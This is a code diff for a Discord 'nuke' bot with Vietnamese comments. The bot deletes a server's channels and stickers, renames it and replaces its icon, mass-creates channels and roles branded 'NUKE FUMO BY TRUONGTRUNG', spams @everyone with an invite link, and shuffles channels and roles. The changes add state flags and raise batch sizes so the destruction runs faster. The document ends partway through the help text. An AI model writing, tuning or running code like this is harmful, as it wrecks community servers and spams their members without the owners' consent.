@@ -4,6 +4,8 @@ const path = require('path');
 const sizeOf = require('image-size');
 
 let autoNukeActive = false;
+let attackActive = false;
+let shuffleChannelsActive = false;
 
 async function loadConfig() {
     const configPath = path.join(__dirname, 'config.json');
@@ -52,7 +54,8 @@ function getRandomColor() {
 async function shuffleChannels(guild, duration = 60000) {
     const endTime = Date.now() + duration;
 
-    while (Date.now() < endTime) {
+    shuffleChannelsActive = true;
+    while (Date.now() < endTime && shuffleChannelsActive) {
         const channels = Array.from(guild.channels.cache.values());
         const shuffledChannels = shuffleArray(channels);
 
@@ -62,8 +65,9 @@ async function shuffleChannels(guild, duration = 60000) {
         }
 
         await Promise.all(setPositionPromises);
-        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before the next shuffle
+        await new Promise(resolve => setTimeout(resolve, 22000)); // Wait 22 seconds before the next shuffle
     }
+    shuffleChannelsActive = false;
 }
 
 async function shuffleRoles(guild, duration = 60000) {
@@ -85,67 +89,114 @@ async function shuffleRoles(guild, duration = 60000) {
 
 async function performAttack(guild, config) {
     console.log('Performing attack on guild:', guild.name);
+    attackActive = true;
 
-    // Xóa kênh và sticker cũ
-    const deleteChannelsPromise = Promise.all(guild.channels.cache.map(channel => channel.delete().catch(console.error)));
-    const deleteStickersPromise = guild.stickers.fetch().then(stickers => Promise.all(stickers.map(sticker => sticker.delete().catch(console.error))));
-
-    // Đặt lại tên và icon server
-    const setNamePromise = guild.setName(config.newServerName).catch(console.error);
-    const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));
-
-    // Tạo 40 kênh
-    const channelNames = Array(40).fill('NUKE FUMO BY TRUONGTRUNG');
-    const createChannelsPromise = batchPromises(channelNames, 5, name => guild.channels.create({ name, type: 0 }).catch(console.error));
-
-    // Tạo sticker
-    let createStickersPromise = Promise.resolve();
     try {
-        const iconPngBuffer = await validateImage('./converted_image.png');
-        createStickersPromise = Promise.all(
-            Array.from({ length: 5 }, (_, i) =>
-                guild.stickers.create({
-                    file: iconPngBuffer,
-                    name: `Sticker${i + 1}`,
-                    description: `Description for Sticker${i + 1}`,
-                    tags: `sticker${i + 1}`
-                }).catch(console.error)
-            )
-        );
-    } catch (error) {
-        console.error('Error validating or creating sticker:', error);
-    }
+        // Xóa kênh và sticker cũ
+        const deleteChannelsPromise = Promise.all(guild.channels.cache.map(channel => channel.delete().catch(console.error)));
+        const deleteStickersPromise = guild.stickers.fetch().then(stickers => Promise.all(stickers.map(sticker => sticker.delete().catch(console.error))));
 
-    // Thực hiện tất cả các lời hứa cùng lúc
-    await Promise.all([
-        deleteChannelsPromise,
-        setNamePromise,
-        setIconPromise,
-        createChannelsPromise,
-        deleteStickersPromise,
-        createStickersPromise
-    ]);
+        // Đặt lại tên và icon server
+        const setNamePromise = guild.setName(config.newServerName).catch(console.error);
+        const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));
 
-    // Spam tin nhắn
-    const newChannels = await createChannelsPromise;
-    const spamPromises = [];
-    for (let i = 0; i < 5; i++) {
-        for (const channel of newChannels) {
-            if (channel.isTextBased()) {
-                spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
+        // Tạo 40 kênh
+        const channelNames = Array(30).fill('NUKE FUMO BY TRUONGTRUNG');
+        const createChannelsPromise = createChannelsConcurrently(guild, channelNames, 20); // Increase batch size to 20
+
+        // Tạo sticker
+        let createStickersPromise = Promise.resolve();
+        try {
+            const iconPngBuffer = await validateImage('./converted_image.png');
+            createStickersPromise = Promise.all(
+                Array.from({ length: 5 }, (_, i) =>
+                    guild.stickers.create({
+                        file: iconPngBuffer,
+                        name: `Sticker${i + 1}`,
+                        description: `Description for Sticker${i + 1}`,
+                        tags: `sticker${i + 1}`
+                    }).catch(console.error)
+                )
+            );
+        } catch (error) {
+            console.error('Error validating or creating sticker:', error);
+        }
+
+        // Thực hiện tất cả các lời hứa cùng lúc
+        await Promise.all([
+            deleteChannelsPromise,
+            setNamePromise,
+            setIconPromise,
+            createChannelsPromise,
+            deleteStickersPromise,
+            createStickersPromise
+        ]);
+
+        // Spam tin nhắn
+        const newChannels = await createChannelsPromise;
+        const spamPromises = [];
+        for (let i = 0; i < 10; i++) {
+            for (const channel of newChannels) {
+                if (channel.isTextBased()) {
+                    spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
+                }
             }
         }
-    }
-    await Promise.all(spamPromises);
+        await Promise.all(spamPromises);
 
-    // Tạo 10 vai trò
-    const roleNames = Array(10).fill('NUKE FUMO BY TRUONGTRUNG');
-    const createRolesPromise = batchPromises(roleNames, 5, name => guild.roles.create({
-        name,
-        permissions: [],
-        color: getRandomColor()
-    }).catch(console.error));
-    await createRolesPromise;
+        // Tạo 10 vai trò
+        const roleNames = Array(10).fill('NUKE FUMO BY TRUONGTRUNG');
+        const createRolesPromise = createRolesConcurrently(guild, roleNames, 10); // Increase batch size to 10
+        await createRolesPromise;
+
+    } finally {
+        attackActive = false;
+    }
+}
+
+async function createChannelsConcurrently(guild, channelNames, batchSize) {
+    const createdChannels = [];
+    let i = 0;
+    while (i < channelNames.length) {
+        const batch = channelNames.slice(i, i + batchSize);
+        const batchPromises = batch.map(name => guild.channels.create({ name, type: 0 }).catch(console.error));
+        const batchResults = await Promise.all(batchPromises);
+        createdChannels.push(...batchResults);
+        i += batchSize;
+    }
+    return createdChannels;
+}
+
+async function createRolesConcurrently(guild, roleNames, batchSize) {
+    const createdRoles = [];
+    let i = 0;
+    while (i < roleNames.length) {
+        const batch = roleNames.slice(i, i + batchSize);
+        const batchPromises = batch.map(name => guild.roles.create({
+            name,
+            permissions: [],
+            color: getRandomColor()
+        }).catch(console.error));
+        const batchResults = await Promise.all(batchPromises);
+        createdRoles.push(...batchResults);
+        i += batchSize;
+    }
+    return createdRoles;
+}
+
+async function createRolesInBatches(guild, roleNames, batchSize) {
+    const createdRoles = [];
+    for (let i = 0; i < roleNames.length; i += batchSize) {
+        const batch = roleNames.slice(i, i + batchSize);
+        const batchPromises = batch.map(name => guild.roles.create({
+            name,
+            permissions: [],
+            color: getRandomColor()
+        }).catch(console.error));
+        const batchResults = await Promise.all(batchPromises);
+        createdRoles.push(...batchResults);
+    }
+    return createdRoles;
 }
 
 async function batchPromises(items, batchSize, fn) {
@@ -186,7 +237,11 @@ async function main() {
         const command = args.shift()?.toLowerCase();
 
         if (command === 'attack') {
-            await performAttack(message.guild, config);
+            if (!autoNukeActive && !shuffleChannelsActive) {
+                await performAttack(message.guild, config);
+            } else {
+                message.channel.send('Cannot perform attack while auto nuke or shuffle channels is active.');
+            }
         } else if (command === 'unban_all') {
             try {
                 const bans = await message.guild.bans.fetch();
@@ -199,11 +254,12 @@ async function main() {
             }
         } else if (command === 'auto_nuke') {
             if (args[0] === 'on') {
-                if (!autoNukeActive) {
+                if (!autoNukeActive && !shuffleChannelsActive) {
                     message.channel.send('Auto nuke started.');
+                    autoNukeActive = true;
                     autoNuke(message.guild, config);
                 } else {
-                    message.channel.send('Auto nuke is already running.');
+                    message.channel.send('Cannot start auto nuke while shuffle channels is active.');
                 }
             } else if (args[0] === 'off') {
                 if (autoNukeActive) {
@@ -216,15 +272,19 @@ async function main() {
                 message.channel.send('Invalid argument. Use "on" or "off".');
             }
         } else if (command === 'shuffle_channels') {
-            shuffleChannels(message.guild, 60000).then(() => {
-                message.channel.send('Shuffled all channels.');
-            });
+            if (!autoNukeActive && !attackActive) {
+                shuffleChannels(message.guild, 60000).then(() => {
+                    message.channel.send('Shuffled all channels.');
+                });
+            } else {
+                message.channel.send('Cannot shuffle channels while auto nuke or attack is active.');
+            }
         } else if (command === 'shuffle_roles') {
             shuffleRoles(message.guild, 60000).then(() => {
                 message.channel.send('Shuffled all roles.');
             });
         } else if (command === 'help') {
-const helpMessage = `
+            const helpMessage = `
 **Available Commands:**
 \`\`\`
 !attack - Perform an attack on the server
